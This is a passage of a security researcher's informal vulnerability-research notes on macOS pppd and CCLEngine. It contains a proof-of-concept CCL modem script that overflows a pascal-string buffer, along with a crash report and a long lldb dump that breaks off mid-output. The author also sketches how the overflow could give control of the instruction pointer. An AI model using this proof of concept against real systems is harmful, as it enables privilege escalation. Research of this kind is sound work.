@@ -1,0 +1,1564 @@
+Ok, so I finally decided to move on to my next target of attack in this ppp stuff. The bug I thought I was sure about last week was after I noticed there's actually per terminal option files which I could call init from. so rather than writing to /etc/ppp/options, I could just create a file called /etc/ppp/options.ttys000 and it would be triggered when pppd was triggered to open on that serial device. through the pppconfd socket I can actually set the device name to be opened, but in theory it wouldn't be a problem for me to set device name to /dev/ppp/../../tmp/options.pwn. unfortunally there was also this bit of code....
+
+/*
+ * options_for_tty - See if an options file exists for the serial
+ * device, and if so, interpret options from it.
+ * We only allow the per-tty options file to override anything from
+ * the command line if it is something that the user can't override
+ * once it has been set by root; this is done by giving configuration
+ * files a lower priority than the command line.
+ */
+int
+options_for_tty()
+{
+    char *dev, *path, *p;
+    int ret;
+    size_t pl;
+
+    dev = devnam;
+    if ((p = strstr(dev, "/dev/")) != NULL)
+	dev = p + 5;
+    if (dev[0] == 0 || strcmp(dev, "tty") == 0)
+	return 1;		/* don't look for /etc/ppp/options.tty */
+    pl = strlen(_PATH_TTYOPT) + strlen(dev) + 1;
+    path = malloc(pl);
+    if (path == NULL)
+	novm("tty init file name");
+    slprintf(path, pl, "%s%s", _PATH_TTYOPT, dev);
+    /* Turn slashes into dots, for Solaris case (e.g. /dev/term/a) */
+    for (p = path + strlen(_PATH_TTYOPT); *p != 0; ++p)
+	if (*p == '/')
+	    *p = '.';
+    option_priority = OPRIO_CFGFILE;
+    ret = options_from_file(path, 0, 0, 1);
+    free(path);
+    return ret;
+}
+
+Notice the part where it says "for solaris case" it turns anu slashes into dots, the the previous example would turn into /dev/ppp.......tmp.options.pwn and totally ruined that vuln. So I decided to move on to the next option (as mentioned above). fuzzing the modem CCL scripts. I think it stands for Carrier Connection Lines or something like that. These script basically are written for different modems to be able to connect over dialup in different ways for different manufactuars. they mainly just send AT commands and check the responses to initialize, dial out or accept calls. I spent a few hours creating a fuzzer for the scripts to see what would come out of it before realizing that the code was avaible online. I took that code and just built my fuzzer directly in there to speed things up 10000x. Before I even got a chance to test the fuzzer there was one crazy idea I wanted to try... sure enough it led to an exploitable crash. Very simple and very powerful. Here's the CCL script...
+
+Joshuas-Mac:osxagent posixninja$ cat ~/Desktop/pwn.ccl/Contents/Resources/Base\ Script.ccl 
+@CCLSCRIPT
+@ORIGINATE
+@ANSWER
+@HANGUP
+WRITE “GoodbyeWorld”
+WRITE B^27B^27B^27B^27B^27B^27B^27B^27B^27B^27
+WRITE ^10
+FLUSH
+EXIT 0
+
+each one of those ^27 strings are "varStrings" which are set outside of the script in multiple ways. I added varString 27 into the Info.plist of the CCL script to simple be 64 "A"'s. unpacked that would be 640 characters. however these scripts are so ancient they actually read in as pascal strings which are limited to 255 bytes. the result is a global stack buffer overflow of 255*128 (32k) bytes of arbitrary data PER LINE. so it can be overwritten as many times as needed as long as it doesn't crash. Because of the nice wonderful scripting interface the provide setting up heap or spraying it is trivial. the scriping language has it's own stack and everything so you can easily overwrite instruction pointer and jump anywhere. Also depressingly the result of this crash uncontroller is to simple send pppd into an infinate loop waiting for the script to finish, but if the script crashes no crashreport will be created and it wasn't possible to debug it to find until I compiled it myself. I've seen it enter that state a number of times before, but without anyway to know wtf it was doing or getting crashreport... I just assumed it didn't work. so there are 100% more bugs in here to be found.
+
+
+Date/Time:             2017-03-18 04:06:56.284 -0400
+OS Version:            Mac OS X 10.12.3 (16D32)
+Report Version:        12
+Anonymous UUID:        61005F47-20DF-D7D6-EE49-5A2EE58D30F8
+
+
+Time Awake Since Boot: 5500 seconds
+
+System Integrity Protection: disabled
+
+Crashed Thread:        0  Dispatch queue: com.apple.main-thread
+
+Exception Type:        EXC_BAD_ACCESS (SIGSEGV)
+Exception Codes:       EXC_I386_GPFLT
+Exception Note:        EXC_CORPSE_NOTIFY
+
+Termination Signal:    Segmentation fault: 11
+Termination Reason:    Namespace SIGNAL, Code 0xb
+Terminating Process:   exc handler [0]
+
+Thread 0 Crashed:: Dispatch queue: com.apple.main-thread
+0   CCLEngine                     	0x00000001094cbf30 PrepStr + 485 (CCLEngine.c:1624)
+1   CCLEngine                     	0x00000001094cb904 PrepScript + 583 (CCLEngine.c:1297)
+2   CCLEngine                     	0x00000001094cb430 Play + 58 (CCLEngine.c:1019)
+3   CCLEngine                     	0x00000001094cabba main + 682 (CCLEngine.c:835)
+4   libdyld.dylib                 	0x00007fff8bbf8255 start + 1
+
+Thread 1:
+0   libsystem_pthread.dylib       	0x00007fff8be0f1e0 start_wqthread + 0
+
+Thread 2:
+0   libsystem_pthread.dylib       	0x00007fff8be0f1e0 start_wqthread + 0
+1   ???                           	0x00007faf9dd0ffff 0 + 140392243724287
+
+Thread 3:
+0   libsystem_pthread.dylib       	0x00007fff8be0f1e0 start_wqthread + 0
+1   ???                           	0x0000700005e50b40 0 + 123145401207616
+
+Thread 0 crashed with X86 Thread State (64-bit):
+  rax: 0x4141414141414141  rbx: 0x0000000000000001  rcx: 0x000000000000001b  rdx: 0x0000000000000000
+  rdi: 0x0000000000000000  rsi: 0x00000000ffffffff  rbp: 0x00007fff567369b0  rsp: 0x00007fff56736960
+   r8: 0x00000001094d0820   r9: 0x0000000000000000  r10: 0x0000000000000000  r11: 0x0000000000000000
+  r12: 0x00000000ffff001e  r13: 0x00007faf9dd0951d  r14: 0x000000000000015e  r15: 0x00000001094d0a7f
+  rip: 0x00000001094cbf30  rfl: 0x0000000000010246  cr2: 0x0000700007997f68
+
+Well, I promised and I delivered. Sorry it took so long. Here's the debug output...
+
+Joshuas-Mac:modemccl-25.1 posixninja$ sudo lldb ./build/Default/CCLEngine 
+(lldb) target create "./build/Default/CCLEngine"
+Current executable set to './build/Default/CCLEngine' (x86_64).
+(lldb) process attach --wait --name CCLEngine
+Process 847 stopped
+* thread #1: tid = 0x2675, 0x000000010bcca000 dyld`_dyld_start, stop reason = signal SIGSTOP
+    frame #0: 0x000000010bcca000 dyld`_dyld_start
+dyld`_dyld_start:
+->  0x10bcca000 <+0>: popq   %rdi
+    0x10bcca001 <+1>: pushq  $0x0
+    0x10bcca003 <+3>: movq   %rsp, %rbp
+    0x10bcca006 <+6>: andq   $-0x10, %rsp
+
+(lldb) c
+Process 847 resuming
+CCLEngine was compiled with optimization - stepping may behave oddly; variables may not be available.
+Process 847 stopped
+* thread #1: tid = 0x2675, 0x000000010b956f30 CCLEngine`PrepStr(destStr=<unavailable>, isVarString=<unavailable>, varIndex=<unavailable>, varSubstitution=1) + 485 at CCLEngine.c:1624, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
+    frame #0: 0x000000010b956f30 CCLEngine`PrepStr(destStr=<unavailable>, isVarString=<unavailable>, varIndex=<unavailable>, varSubstitution=1) + 485 at CCLEngine.c:1624 [opt]
+   1621	                        maskPtr = d + SV.maskStart - 1;
+   1622	                    }
+   1623	
+-> 1624	                    for (i = 1; i <= *vsp; i++, dstStrLen++)
+   1625	                        *d++ = vsp[i];
+   1626	
+   1627	                    if (maskPtr) {
+(lldb) print i
+(int) $0 = 1
+(lldb) print vsp
+(u_int8_t *) $1 = 0x4141414141414141 ""
+(lldb) bt
+* thread #1: tid = 0x2675, 0x000000010b956f30 CCLEngine`PrepStr(destStr=<unavailable>, isVarString=<unavailable>, varIndex=<unavailable>, varSubstitution=1) + 485 at CCLEngine.c:1624, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
+  * frame #0: 0x000000010b956f30 CCLEngine`PrepStr(destStr=<unavailable>, isVarString=<unavailable>, varIndex=<unavailable>, varSubstitution=1) + 485 at CCLEngine.c:1624 [opt]
+    frame #1: 0x000000010b956904 CCLEngine`PrepScript + 583 at CCLEngine.c:1296 [opt]
+    frame #2: 0x000000010b956430 CCLEngine`Play + 58 at CCLEngine.c:1019 [opt]
+    frame #3: 0x000000010b955bba CCLEngine`main(argc=<unavailable>, argv=<unavailable>) + 682 at CCLEngine.c:835 [opt]
+    frame #4: 0x00007fff8bbf8255 libdyld.dylib`start + 1
+(lldb) print d
+error: Couldn't materialize: couldn't get the value of variable d: variable not available
+error: errored out in DoExecute, couldn't PrepareToExecuteJITExpression
+(lldb) x/x d
+error: memory read failed for 0x0
+(lldb) print maskPtr
+error: Couldn't materialize: couldn't get the value of variable maskPtr: variable not available
+error: errored out in DoExecute, couldn't PrepareToExecuteJITExpression
+(lldb) print SV
+(TRScriptVars) $2 = {
+  ctlFlags = 0
+  serialSpeed = 0
+  maskStringId = '\0'
+  maskStart = '\0'
+  maskStop = '\0'
+  theAbortErr = 0
+  modemReliability = '\0'
+  modemCompression = '\0'
+  commands = 0x00007f9d22508700
+  answerLine = 3
+  originateLine = 2
+  hangUpLine = 4
+  pauseTimer = 0
+  chrDelayValue = 0
+  script = 0x00007f9d22508340 "@CCLSCRIPT\n@ORIGINATE\n@ANSWER\n@HANGUP\nWRITE \xffffffe2\xffffff80\xffffff9cGoodbyeWorld\xffffffe2\xffffff80\xffffff9d\nWRITE B^27B^27B^27B^27B^27B^27B^27B^27B^27B^27\nWRITE ^10\nFLUSH\nEXIT 0\n"
+  scriptPrepped = '\0'
+  scriptPrepFailed = '\0'
+  scriptAllocSize = 0
+  scriptSize = 133
+  lineCount = 9
+  indexTable = 0x00007f9d225085d0
+  scriptLineIndex = 6
+  scriptLine = 6
+  scriptLinePtr = 0x00007f9d2250837f "WRITE B^27B^27B^27B^27B^27B^27B^27B^27B^27B^27\nWRITE ^10\nFLUSH\nEXIT 0\n"
+  scriptLineSize = '.'
+  loopCounter = 0
+  labels = {
+    [0] = 0
+    [1] = 0
+    [2] = 0
+    [3] = 0
+    [4] = 0
+    [5] = 0
+    [6] = 0
+    [7] = 0
+    [8] = 0
+    [9] = 0
+    [10] = 0
+    [11] = 0
+    [12] = 0
+    [13] = 0
+    [14] = 0
+    [15] = 0
+    [16] = 0
+    [17] = 0
+    [18] = 0
+    [19] = 0
+    [20] = 0
+    [21] = 0
+    [22] = 0
+    [23] = 0
+    [24] = 0
+    [25] = 0
+    [26] = 0
+    [27] = 0
+    [28] = 0
+    [29] = 0
+    [30] = 0
+    [31] = 0
+    [32] = 0
+    [33] = 0
+    [34] = 0
+    [35] = 0
+    [36] = 0
+    [37] = 0
+    [38] = 0
+    [39] = 0
+    [40] = 0
+    [41] = 0
+    [42] = 0
+    [43] = 0
+    [44] = 0
+    [45] = 0
+    [46] = 0
+    [47] = 0
+    [48] = 0
+    [49] = 0
+    [50] = 0
+    [51] = 0
+    [52] = 0
+    [53] = 0
+    [54] = 0
+    [55] = 0
+    [56] = 0
+    [57] = 0
+    [58] = 0
+    [59] = 0
+    [60] = 0
+    [61] = 0
+    [62] = 0
+    [63] = 0
+    [64] = 0
+    [65] = 0
+    [66] = 0
+    [67] = 0
+    [68] = 0
+    [69] = 0
+    [70] = 0
+    [71] = 0
+    [72] = 0
+    [73] = 0
+    [74] = 0
+    [75] = 0
+    [76] = 0
+    [77] = 0
+    [78] = 0
+    [79] = 0
+    [80] = 0
+    [81] = 0
+    [82] = 0
+    [83] = 0
+    [84] = 0
+    [85] = 0
+    [86] = 0
+    [87] = 0
+    [88] = 0
+    [89] = 0
+    [90] = 0
+    [91] = 0
+    [92] = 0
+    [93] = 0
+    [94] = 0
+    [95] = 0
+    [96] = 0
+    [97] = 0
+    [98] = 0
+    [99] = 0
+    [100] = 0
+    [101] = 0
+    [102] = 0
+    [103] = 0
+    [104] = 0
+    [105] = 0
+    [106] = 0
+    [107] = 0
+    [108] = 0
+    [109] = 0
+    [110] = 0
+    [111] = 0
+    [112] = 0
+    [113] = 0
+    [114] = 0
+    [115] = 0
+    [116] = 0
+    [117] = 0
+    [118] = 0
+    [119] = 0
+    [120] = 0
+    [121] = 0
+    [122] = 0
+    [123] = 0
+    [124] = 0
+    [125] = 0
+    [126] = 0
+    [127] = 0
+  }
+  matchStr = {
+    [0] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [1] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [2] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [3] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [4] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [5] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [6] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [7] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [8] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [9] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [10] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [11] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [12] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [13] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [14] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [15] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [16] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [17] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [18] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [19] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [20] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [21] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [22] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [23] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [24] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [25] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [26] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [27] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [28] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [29] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [30] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [31] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [32] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [33] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [34] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [35] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [36] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [37] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [38] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [39] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [40] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [41] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [42] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [43] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [44] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [45] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [46] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [47] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [48] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [49] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [50] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [51] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [52] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [53] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [54] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [55] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [56] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [57] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [58] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [59] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [60] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [61] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [62] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [63] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [64] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [65] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
+      matchStrIndex = '\0'
+      varStr = 0x0000000000000000 <no value available>
+      inVarStr = '\0'
+      varStrIndex = '\0'
+      varStrSize = '\0'
+      matchLine = 0
+    }
+    [66] = {
+      matchStr = 0x0000000000000000 <no value available>
+      delimiterChar = '\0'
